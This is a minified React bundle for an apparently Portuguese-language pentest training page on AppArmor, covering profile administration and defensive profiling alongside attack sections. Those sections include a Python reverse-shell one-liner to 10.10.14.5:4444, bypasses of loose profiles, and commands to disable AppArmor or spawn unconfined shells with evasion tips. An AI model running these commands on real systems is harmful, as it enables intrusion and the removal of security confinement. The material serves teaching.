import{j as e}from"./index-Bd5otbF3.js";import{P as s}from"./PageContainer-BFcnvssG.js";import{A as r}from"./AlertBox-CL6YULjX.js";import{C as i}from"./CodeBlock-C2J-D4l6.js";import{C as a}from"./CommandTable-BxJEHhQ9.js";import{T as o,P as n}from"./PracticeBox-Pst8IaIf.js";function u(){return e.jsxs(s,{title:"AppArmor",subtitle:"MAC baseado em path: confina processos por profile. Como administrar — e como mapear/contornar profiles fracos em pentest.",difficulty:"avancado",timeToRead:"20 min",children:[e.jsx("h2",{children:"O que é AppArmor (e por que importa pra você)"}),e.jsxs("p",{children:[e.jsx("strong",{children:"AppArmor"})," é um ",e.jsx("em",{children:"Mandatory Access Control"})," (MAC) do kernel Linux, usado por padrão em Ubuntu, Debian e — opcionalmente — no Kali. Ao contrário do SELinux (baseado em label), o AppArmor confina processos por ",e.jsx("strong",{children:"caminho de arquivo"}),": cada profile descreve quais arquivos um binário pode ler/escrever/executar e quais capabilities/sockets ele pode usar."]}),e.jsxs("p",{children:["Pra você como atacante, isso significa três coisas: (1) seu reverse shell pode falhar em comandos óbvios porque o profile do ",e.jsx("code",{children:"nginx"})," ou ",e.jsx("code",{children:"mysqld"}),"bloqueou; (2) profiles em ",e.jsx("code",{children:"complain"})," mode ",e.jsx("em",{children:"logam"})," tudo (rastros); e (3) profiles mal escritos (com globs frouxos) deixam buracos exploráveis."]}),e.jsx("h2",{children:"Status e enumeração"}),e.jsx(o,{path:"~",lines:[{cmd:"sudo aa-status",out:`apparmor module is loaded.
42 profiles are loaded.
38 profiles are in enforce mode.
   /usr/bin/man
   /usr/bin/evince
   /usr/sbin/cups-browsed
   /usr/sbin/mysqld
   /usr/sbin/nginx
   docker-default
   lsb_release
   ...
4 profiles are in complain mode.
   /usr/sbin/dnsmasq
   /usr/sbin/tcpdump
   ...
12 processes have profiles defined.
12 processes are in enforce mode.
   /usr/sbin/cups-browsed (1024)
   /usr/sbin/mysqld (1834)
   /usr/sbin/nginx (2189) nginx
   /usr/sbin/nginx (2190) nginx`,outType:"info"},{comment:"ver de qual profile um processo herda",cmd:"cat /proc/$(pgrep -f mysqld | head -1)/attr/current",out:"/usr/sbin/mysqld (enforce)",outType:"warning"},{comment:"checar do seu próprio shell",cmd:"cat /proc/self/attr/current",out:"unconfined",outType:"success"}]}),e.jsx(a,{title:"ferramentas chave do pacote apparmor-utils",variations:[{cmd:"aa-status",desc:"Resumo: quantos profiles, quais em enforce/complain, processos confinados.",output:"Sempre o primeiro comando."},{cmd:"aa-enabled",desc:"Boolean: AppArmor está ativo no kernel?",output:"Yes"},{cmd:"aa-enforce /etc/apparmor.d/usr.sbin.nginx",desc:"Coloca profile em ENFORCE (bloqueia).",output:"Setting /etc/apparmor.d/usr.sbin.nginx to enforce mode."},{cmd:"aa-complain /etc/apparmor.d/usr.sbin.nginx",desc:"Coloca em COMPLAIN (loga, não bloqueia).",output:"Útil para descobrir o que o app precisa."},{cmd:"aa-disable /etc/apparmor.d/usr.sbin.nginx",desc:"Desativa profile (cria symlink em disable/).",output:"PARA o confinamento. Cuidado."},{cmd:"aa-genprof /usr/local/bin/meu_app",desc:"Wizard interativo: gera profile aprendendo o que o app faz.",output:"Anota syscalls/paths em modo learning."},{cmd:"aa-logprof",desc:"Lê /var/log/audit/audit.log e atualiza profiles em complain mode.",output:"Pergunta interativamente Allow/Deny."},{cmd:"apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx",desc:"Recarrega um profile depois de editar.",output:"(silencioso = ok)"},{cmd:"apparmor_parser -R /etc/apparmor.d/usr.sbin.nginx",desc:"Remove profile do kernel.",output:"Profile descarregado."}]}),e.jsx("h2",{children:"Anatomia de um profile"}),e.jsx(i,{language:"ini",title:"/etc/apparmor.d/usr.sbin.nginx (excerto comentado)",code:`#include <tunables/global>

/usr/sbin/nginx flags=(attach_disconnected) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/openssl>

  # capabilities permitidas
  capability dac_override,
  capability net_bind_service,    # bind em portas <1024
  capability setgid,
  capability setuid,

  # rede
  network inet stream,
  network inet6 stream,

  # binários
  /usr/sbin/nginx mr,             # m=memory map, r=read

  # config
  /etc/nginx/** r,
  /etc/ssl/certs/** r,

  # PID e sockets
  /run/nginx.pid rw,
  /var/run/nginx.pid rw,

  # logs (escreve)
  /var/log/nginx/*.log w,

  # docroot — atenção: ** é recursivo (vetor de bypass se largo demais)
  /var/www/** r,
  /usr/share/nginx/** r,

  # NEGAÇÕES explícitas (ganham de allow)
  deny /etc/shadow r,
  deny /etc/ssh/** r,

  # subprofile: cgi-fpm rodaria aqui se existisse
}`}),e.jsx("h2",{children:"Modos: enforce vs complain"}),e.jsx(o,{path:"~",lines:[{comment:"coloca nginx em complain pra debugar uma feature nova",cmd:"sudo aa-complain /etc/apparmor.d/usr.sbin.nginx",out:"Setting /etc/apparmor.d/usr.sbin.nginx to complain mode.",outType:"warning"},{comment:"exercita o app — toda violação vira log audit",cmd:"curl http://localhost/feature-nova/",out:"(200)",outType:"muted"},{cmd:'sudo grep apparmor="DENIED" /var/log/kern.log | tail -3',out:'kernel: audit: type=1400 audit(...): apparmor="DENIED" operation="open" profile="/usr/sbin/nginx" name="/var/lib/feature/cache.db" pid=2189 requested_mask="r" denied_mask="r" fsuid=33 ouid=33',outType:"error"},{comment:"aa-logprof importa essas violações e pergunta Allow/Deny",cmd:"sudo aa-logprof",out:`Reading log entries from /var/log/audit/audit.log.
Profile:  /usr/sbin/nginx
Path:     /var/lib/feature/cache.db
New Mode: r
Severity: 4
[1 - include <abstractions/...>]
 2 - /var/lib/feature/cache.db r,
(A)llow / [(D)eny] / (I)gnore / (G)lob / (N)ew / (X) ... :`,outType:"info"}]}),e.jsx("h2",{children:"━━━ Defesa: criar profile do zero ━━━"}),e.jsx(o,{path:"~",lines:[{comment:"wizard interativo - aprende rodando o app",cmd:"sudo aa-genprof /usr/local/bin/meu_listener.py",out:`Profile: /usr/local/bin/meu_listener.py
Please start the application to be profiled in another window and
exercise its functionality now.

Once finished, select the "Scan system log..." option below.
[(S)can system log for AppArmor events] / (F)inish`,outType:"info"},{comment:"no outro terminal, exercita o app",cmd:"/usr/local/bin/meu_listener.py & curl http://localhost:8080/",out:"(...)",outType:"muted"},{comment:"volta no aa-genprof e tecla S",cmd:"S",out:`Profile:  /usr/local/bin/meu_listener.py
Path:     /usr/local/bin/meu_listener.py
New Mode: r
[1 - /usr/local/bin/meu_listener.py r,]
(A)llow / [(D)eny] / ...`,outType:"warning"},{comment:"ao terminar, salva e ativa em enforce",cmd:"sudo aa-enforce /etc/apparmor.d/usr.local.bin.meu_listener.py",out:"Setting /etc/apparmor.d/usr.local.bin.meu_listener.py to enforce mode.",outType:"success"}]}),e.jsx("h2",{children:"━━━ Ataque: enumerar AppArmor em alvo comprometido ━━━"}),e.jsxs("p",{children:["Você ganhou shell como ",e.jsx("code",{children:"www-data"})," e o reverse shell parece engessado: comandos óbvios ",e.jsx("em",{children:'"Permission denied"'})," mesmo lendo arquivo onde",e.jsx("code",{children:"www-data"})," tem acesso. Suspeite de AppArmor."]}),e.jsx(o,{path:"~",lines:[{cmd:"id; cat /proc/self/attr/current",out:`uid=33(www-data) gid=33(www-data) groups=33(www-data)
/usr/sbin/apache2//DEFAULT_URI (enforce)`,outType:"warning"},{comment:"encontra o profile que está te confinando",cmd:"ls /etc/apparmor.d/",out:`abstractions/  disable/  local/  tunables/
usr.sbin.apache2     usr.sbin.mysqld     usr.sbin.nginx
usr.sbin.tcpdump     usr.sbin.cupsd      ...`,outType:"default"},{cmd:"cat /etc/apparmor.d/usr.sbin.apache2 | head -30",out:`# vim:syntax=apparmor
/usr/sbin/apache2 flags=(attach_disconnected) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  capability dac_override,
  capability setgid,
  capability setuid,
  capability net_bind_service,
  /etc/apache2/** r,
  /usr/lib/apache2/** mr,
  /var/log/apache2/** rw,
  /var/www/** r,
  /tmp/** rw,                      # <-- frouxo: qualquer coisa em /tmp
  /usr/bin/perl ix,                # <-- ix = "inherit + exec" = perl roda DENTRO do profile
  /usr/bin/python3* ix,            # <-- idem python
}`,outType:"error"},{comment:"filtra logs de denied recentes (já te dá pista do que tentou bloquear)",cmd:"sudo dmesg | grep DENIED | tail",out:`apparmor="DENIED" operation="exec" profile="/usr/sbin/apache2" name="/usr/bin/nc" requested_mask="x" denied_mask="x"
apparmor="DENIED" operation="open" profile="/usr/sbin/apache2" name="/etc/shadow" requested_mask="r" denied_mask="r"`,outType:"warning"}]}),e.jsx("h2",{children:"━━━ Ataque: bypass de profile mal escrito ━━━"}),e.jsx("p",{children:"Profiles fracos têm padrões reconhecíveis. Os 4 mais explorados:"}),e.jsx(a,{title:"patterns explorables em profiles",variations:[{cmd:"/tmp/** rwix",desc:"Permite executar qualquer coisa de /tmp.",output:"Dropa binário lá e executa: /tmp/meu_implant"},{cmd:"/usr/bin/python3* ix",desc:"Python herda profile; com ix você roda código Python ARBITRÁRIO confinado pelo MESMO profile do parent (que pode ser amplo).",output:`python3 -c 'import os; os.system("id")'`},{cmd:"/** r",desc:"Leitura recursiva total. Lê /etc/shadow se UID permitir.",output:"Tipicamente combinado com root + DAC ruim."},{cmd:"Px / Cx sem limites",desc:"Px = transição para outro profile, Cx = filho. Se o profile destino for fraco, encadeia.",output:"Pular de um profile estrito pra um lasco."}]}),e.jsx(o,{path:"~",lines:[{comment:"exemplo: profile permite python3 ix → escapamos pra fazer o que queremos",cmd:`python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.5",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; subprocess.call(["bash","-i"])'`,out:"(reverse shell — roda DENTRO do profile do apache2, mas é interativo)",outType:"error"},{comment:"checar capabilities herdadas — se net_admin/sys_ptrace estão liberadas, dá PrivEsc",cmd:"capsh --print",out:`Current: cap_net_bind_service,cap_setuid,cap_setgid,cap_dac_override+ep
Bounding set =cap_chown,cap_dac_override,...`,outType:"warning"}]}),e.jsx("h2",{children:"━━━ Ataque: desativar AppArmor com root ━━━"}),e.jsx(o,{path:"~",lines:[{comment:"se você JÁ é root, o problema some — mas deixa rastro",cmd:"sudo aa-disable /etc/apparmor.d/usr.sbin.apache2",out:"Disabling /etc/apparmor.d/usr.sbin.apache2.",outType:"warning"},{comment:"ou kernel-wide (NUNCA faça em alvo real — totalmente óbvio em telemetria)",cmd:"sudo systemctl disable --now apparmor",out:"Removed /etc/systemd/system/sysinit.target.wants/apparmor.service.",outType:"error"},{comment:"técnica menos óbvia: rodar processo já FORA do confinamento via aa-exec",cmd:"sudo aa-exec -p unconfined -- /bin/bash",out:"(shell sem nenhum profile)",outType:"muted"}]}),e.jsx(r,{type:"warning",title:"AppArmor não é firewall, mas é uma camada que confunde",children:e.jsxs("p",{children:["Mesmo profiles toscos atrasam um atacante: forçam você a parar, ler",e.jsx("code",{children:"/etc/apparmor.d/"}),", descobrir ",e.jsx("em",{children:"quais"})," binários você pode invocar (",e.jsx("code",{children:"ix"}),") e adaptar payload. Pra blue team isso é ouro: cada",e.jsx("code",{children:"aa-genprof"})," que você completa empurra o adversário pra deixar mais log."]})}),e.jsx(n,{title:"Profile mínimo de listener Python + tentativa de fuga",goal:"Criar profile estrito que SÓ permite o listener escutar e logar; depois validar que ele não consegue executar ferramentas externas.",steps:["Crie /usr/local/bin/listener.py simples (escuta em 8080 e ecoa).","Rode aa-genprof /usr/local/bin/listener.py.","Exercite o listener com curl localhost:8080.","Salve o profile e coloque em ENFORCE.","Tente, dentro do listener (ou injetando), executar /usr/bin/id — deve falhar com DENIED."],command:`sudo aa-genprof /usr/local/bin/listener.py
# (passos interativos)
sudo aa-enforce /etc/apparmor.d/usr.local.bin.listener.py
sudo aa-status | grep listener
sudo dmesg | grep DENIED | tail -3`,expected:`/usr/local/bin/listener.py (enforce)
apparmor="DENIED" operation="exec" profile="/usr/local/bin/listener.py" name="/usr/bin/id" requested_mask="x" denied_mask="x"`,verify:"O DENIED em dmesg comprova que o profile bloqueou exec arbitrário, mesmo o listener rodando como root."}),e.jsx(r,{type:"info",title:"AppArmor vs SELinux — quando usar qual",children:e.jsxs("p",{children:["AppArmor é mais simples, lê path-based, bom pra confinar daemons (nginx, mysql, libvirt). SELinux é mais expressivo mas mais complexo (RHEL/Fedora/Android). Em pentest contra Debian/Ubuntu você vai encontrar AppArmor 95% das vezes; em RedHat/CentOS, SELinux. Os dois ",e.jsx("em",{children:"nunca"})," rodam juntos."]})})]})}export{u as default};
